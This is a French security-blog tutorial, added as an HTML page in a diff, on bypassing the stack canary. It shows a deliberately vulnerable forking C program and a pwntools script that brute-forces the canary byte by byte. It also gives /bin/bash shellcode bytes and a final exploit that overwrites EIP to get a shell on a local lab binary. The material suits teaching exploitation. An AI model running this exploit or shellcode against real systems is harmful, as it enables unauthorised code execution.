@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="Depuis l’avènement des Buffer Overflow dans le début des années 90, les experts en sécurité informatique ont cherché de nouvelles protections contre ce type d&#39;attaques. Ainsi sont nées bons...">
+        <meta name="keywords" content="Buffer Overflow, Etude de cas, Tutoriel">
+        <link rel="icon" href="https://www.dailysecurity.fr/favicon.png">
+        <title>La Stack Smashing Protection: Un canary infaillible? - Daily Security</title>
+
+        <!-- Stylesheets -->
+        <link href="https://www.dailysecurity.fr/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <link href="https://www.dailysecurity.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daily Security Full Atom Feed" />
+        <link href="https://www.dailysecurity.fr/category/journal-de-geluchat/feed/index.xhtml" type="application/atom+xml" rel="alternate" title="Daily Security Categories Atom Feed" />
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('https://www.dailysecurity.fr/images/fond.png'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+ 
+                       <a class="pull-left" href="https://www.dailysecurity.fr/" style="outline : none;"><img class="mr20 hidden-xs" src="https://www.dailysecurity.fr/images/logo.png" height="57" width="312" alt="logo"></a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="https://www.dailysecurity.fr/">Accueil</a>
+                                <a href="https://www.dailysecurity.fr/categories.html">Catégories</a>
+                            <a  href="https://www.dailysecurity.fr/presentation">À propos</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">La Stack Smashing Protection: Un canary infaillible?</h1>
+                      <p class="header-date">Par <a href="https://www.dailysecurity.fr/author/geluchat.html">Geluchat</a>, mer. 04 février 2015, dans la catégorie <a href="https://www.dailysecurity.fr/category/journal-de-geluchat.html">Journal de geluchat</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="https://www.dailysecurity.fr/tag/buffer-overflow.html">Buffer Overflow</a>, <a href="https://www.dailysecurity.fr/tag/etude-de-cas.html">Etude de cas</a>, <a href="https://www.dailysecurity.fr/tag/tutoriel.html">Tutoriel</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <p>Depuis l’avènement des Buffer Overflow dans le début des années 90, les experts en sécurité informatique ont cherché de nouvelles protections contre ce type d'attaques.</p>
+<p>Ainsi sont nées bons nombres de protections connues telles que le fameux ASLR(Address Space Layout Randomization) , le NX (Non-executable) ou encore le SOURCE FORTIFY (remplacement de fonctions dangereuses par sa version sécurisée: strcpy=&gt;strncpy).</p>
+<p>Mais celle qui a fait le plus parler d'elle dans le monde des failles applicatives reste la Stack Smashing Protection aussi appelée "Canary" ou Cookie.</p>
+<p>Voici un petit exemple de ce à quoi ressemble la Stack dans une fonction sur un programme avec la SSP activée.</p>
+<div class="highlight"><pre><span></span><code><span class="nb">+-------------------------+</span><span class="c"></span>
+<span class="c">|                         |</span>
+<span class="c">|        Save EIP         |</span>
+<span class="c">|                         |</span>
+<span class="nb">+-------------------------+</span><span class="c"></span>
+<span class="c">|                         |</span>
+<span class="c">|        Save EBP         |</span>
+<span class="c">|                         |</span>
+<span class="nb">+-------------------------+</span><span class="c"></span>
+<span class="c">|                         |</span>
+<span class="c">|        Padding          |</span>
+<span class="c">|                         |</span>
+<span class="nb">+-------------------------+</span><span class="c"></span>
+<span class="c">|                         |</span>
+<span class="c">|        Canary           |</span>
+<span class="c">|                         |</span>
+<span class="nb">+-------------------------+</span><span class="c"></span>
+<span class="c">|                         |</span>
+<span class="c">|    char badbuffer</span><span class="k">[</span><span class="c">64</span><span class="k">]</span><span class="c">   |</span>
+<span class="c">|                         |</span>
+<span class="nb">+-------------------------+</span><span class="c"></span>
+</code></pre></div>
+
+<p>On peut voir qu'un Canary été inséré entre notre buffer et le couple EBP (Frame Pointer) et EIP (Return Adress).</p>
+<p>Pour mieux comprendre prenons l'exemple suivant:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;memory.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">goodbuffer</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">badbuffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">badbuffer</span><span class="p">,</span><span class="n">goodbuffer</span><span class="p">,</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pid</span><span class="p">,</span><span class="n">real_size</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">goodbuffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">size</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"> </span><span class="c1">// On enleve le buffering de stdout</span>
+<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size: &quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// On demande la taille de la chaine à recevoir</span>
+<span class="w">            </span><span class="n">fgets</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="n">real_size</span><span class="o">=</span><span class="n">atoi</span><span class="p">(</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Input: &quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="n">fgets</span><span class="p">(</span><span class="n">goodbuffer</span><span class="p">,</span><span class="w"> </span><span class="n">real_size</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="n">goodbuffer</span><span class="p">[</span><span class="n">real_size</span><span class="mi">-1</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="n">vuln</span><span class="p">(</span><span class="o">&amp;</span><span class="n">goodbuffer</span><span class="p">,</span><span class="w"> </span><span class="n">real_size</span><span class="mi">-1</span><span class="p">);</span><span class="w"> </span><span class="c1">// Fonction vulnérable</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Done</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="k">else</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Le <a href="https://www.dailysecurity.fr/return_oriented_programming/">ROP</a> n'est pas l'objet de cet article, nous allons donc désactiver l'ASLR et le NX (-z execstack), on rajoute bien évidement l'option Smash Stack Protection (-fstack-protector).</p>
+<div class="highlight"><pre><span></span><code><span class="gp">root@Geluchat:~# </span><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space <span class="c1"># Desactive l&#39;ALSR</span>
+<span class="gp">root@Geluchat:~# </span>gcc SSPbypass.c -Wall -o SSPbypass -z norelro -z execstack -fstack-protector -m32
+<span class="gp">root@Geluchat:~# </span>chmod +x SSPbypass
+<span class="gp">root@Geluchat:~# </span>./SSPbypass
+</code></pre></div>
+
+<p>A la fin de la fonction vuln() le canary est vérifié, s'il a été modifié par l'exploitation d'un Buffer overflow classique on obtient une erreur du type:</p>
+<div class="highlight"><pre><span></span><code><span class="go">*** stack smashing detected ***: SSPbypass - terminated</span>
+<span class="go">SSPbypass: stack smashing attack in function  - terminated</span>
+</code></pre></div>
+
+<p>Et bien sûr notre exploitation échoue.</p>
+<p>Cette protection semble parfaite contre ce type de Buffer overflow, néanmoins elle reste contournable.</p>
+<p>En effet, si l'on réécrit le canary par sa vraie valeur pendant l'exploitation, à la fin de la fonction le canary n'aura pas été modifié et le programme continuera son exécution.</p>
+<p>Mais cette méthode à un gros défaut, un canary classique fait 4 octets (sur du 32 bits, par exemple 0x61626364) soit 256^4 qui correspond à 1 chance sur 4294967296, autant dire que sur un programme distant, ça reste impossible à exploiter.</p>
+<p>La bonne méthode est donc ailleurs.</p>
+<p>Pour trouver notre canary, il va falloir procéder en plusieurs fois. Je m'explique, le canary faisant dans notre cas 4 octets:</p>
+<ul>
+<li>Nous pouvons le deviner octet par octet à la manière d'une SQL Blind.</li>
+<li>Nous savons aussi que le programme proposé plus haut retourne la chaine "Done" quand tout s'est bien déroulé et rien quand on a écrasé le canary.</li>
+<li>Si le premier octet du canary est égal à 0x61 il ne retournera pas la chaine tant qu'on ne lui envoie pas 0x61.</li>
+<li>Un appel à la fonction fork() copie le canary, il reste donc le même à chaque connexion tant que le programme n'est pas fini.</li>
+</ul>
+<p>On peut donc effectuer un bruteforce byte par byte, c'est ce que fait le script suivant:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./SSPbypass&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">wait</span><span class="p">(</span><span class="n">until</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">until</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">p</span><span class="p">,</span> <span class="n">libc</span>
+    <span class="k">if</span> <span class="n">p</span> <span class="ow">is</span> <span class="ow">not</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./SSPbypass&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">dumb</span><span class="o">=</span><span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Input: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> 
+    <span class="k">return</span> <span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">bufsize</span><span class="p">,</span><span class="n">canarysize</span><span class="p">):</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">canarysize</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+            <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">leak</span> <span class="o">+</span> <span class="n">hex_byte</span>
+            <span class="n">resp</span><span class="o">=</span><span class="n">trigger</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># On test le cookie byte par byte</span>
+            <span class="k">if</span> <span class="s1">&#39;Done&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+                <span class="n">leak</span> <span class="o">+=</span> <span class="n">hex_byte</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] byte : </span><span class="si">%r</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">hex_byte</span><span class="p">)</span>
+                <span class="k">break</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">255</span><span class="p">):</span>
+                <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Hum :(&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">leak</span>
+
+<span class="n">start</span><span class="p">()</span>
+<span class="n">canary</span><span class="o">=</span><span class="n">leak</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>   
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Canary </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">u32</span><span class="p">(</span><span class="n">canary</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]))</span>
+<span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">64</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="s2">&quot;bbbb&quot;</span><span class="p">)</span> <span class="c1"># Rewrite eip par bbbb</span>
+</code></pre></div>
+
+<p>Il ne reste plus ensuite qu'à exploiter le programme de manière classique:</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>On <span class="nb">export</span> notre shellcode dans une variable d<span class="err">&#39;</span>environnement
+<span class="go">http://shell-storm.org/shellcode/files/shellcode-606.php execve(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;, &quot;-p&quot;], NULL)</span>
+<span class="gp">root@Geluchat:~# </span><span class="nb">export</span> <span class="nv">SC</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s2">&quot;print &#39;\x90&#39;*100+&#39;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#39;&quot;</span><span class="k">)</span>
+<span class="gp">root@Geluchat:~#</span>./getenv SC
+<span class="go">0xffffdf3e</span>
+</code></pre></div>
+
+<p>getenv.c</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Exploit final :</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./SSPbypass&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">wait</span><span class="p">(</span><span class="n">until</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">until</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">p</span><span class="p">,</span> <span class="n">libc</span>
+    <span class="k">if</span> <span class="n">p</span> <span class="ow">is</span> <span class="ow">not</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./SSPbypass&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">dumb</span><span class="o">=</span><span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Input: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> 
+    <span class="k">return</span> <span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Size: &quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">bufsize</span><span class="p">,</span><span class="n">canarysize</span><span class="p">):</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">canarysize</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+            <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">leak</span> <span class="o">+</span> <span class="n">hex_byte</span>
+            <span class="n">resp</span><span class="o">=</span><span class="n">trigger</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="c1"># On test le cookie byte par byte</span>
+            <span class="k">if</span> <span class="s1">&#39;Done&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+                <span class="n">leak</span> <span class="o">+=</span> <span class="n">hex_byte</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] byte : </span><span class="si">%r</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">hex_byte</span><span class="p">)</span>
+                <span class="k">break</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">255</span><span class="p">):</span>
+                <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Hum :(&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">leak</span>
+
+
+<span class="k">def</span> <span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;Enjoy your shell!&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;python -c </span><span class="se">\&quot;</span><span class="s2">import pty;pty.spawn(&#39;/bin/bash&#39;)</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">start</span><span class="p">()</span>
+<span class="n">canary</span><span class="o">=</span><span class="n">leak</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>   
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Canary </span><span class="si">%#x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">u32</span><span class="p">(</span><span class="n">canary</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]))</span>
+<span class="n">buf</span><span class="o">=</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">64</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xffffdf3e</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span> <span class="c1"># On ajoute +20 en raison du padding de l&#39;environnement</span>
+<span class="n">p</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">wait</span><span class="p">(</span><span class="s2">&quot;Input: &quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> 
+<span class="n">getshell</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Un dernier détail important, le canary, sous certaines distributions, peut contenir des null-bytes, il ne sera bypassable que sous certaines conditions, par exemple l’utilisation d’une fonction recv() couplée à un memcpy() qui sont deux fonctions gérants les null-bytes.</p>
+<p>Voila, c’est déjà terminé, n’hésitez pas à rejoindre mon Twitter pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.</p>
+<p>Geluchat.</p>
+
+
+    <div class="comments">
+        <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'dailysecurity-fr';
+                var disqus_identifier = 'la-stack-smashing-protection';
+                var disqus_url = 'https://www.dailysecurity.fr/la-stack-smashing-protection';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+        <noscript>Please enable JavaScript to view the comments.</noscript>
+    </div>
+        
+    </div>
+        <!-- /Content -->
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://www.dailysecurity.fr/archives.html">Archives</a></li>
+                            <li><a href="https://www.dailysecurity.fr/categories.html">Catégories</a></li>
+                            <li><a href="https://www.dailysecurity.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">Flux RSS</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://twitter.com/Geluchat" target="_blank">Twitter</a></li>
+                            <li><a href="https://github.com/Geluchat" target="_blank">GitHub</a></li>
+                            <li><a href="https://www.linkedin.com/in/baptiste-devigne/" target="_blank">Linkedin</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Les blogs des amis</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://proofofcalc.com/" target="_blank">Proof of Calc</a></li>
+                            <li><a href="http://beta.hackndo.com" target="_blank">Blog de Pixis</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+        <!-- Google Analytics -->
+        <script>
+          (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+          })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+          ga('create', 'UA-97100797-1', 'auto');
+          ga('send', 'pageview');
+        </script>
+        <!-- /Google Analytics -->
+     </body>
+</html>
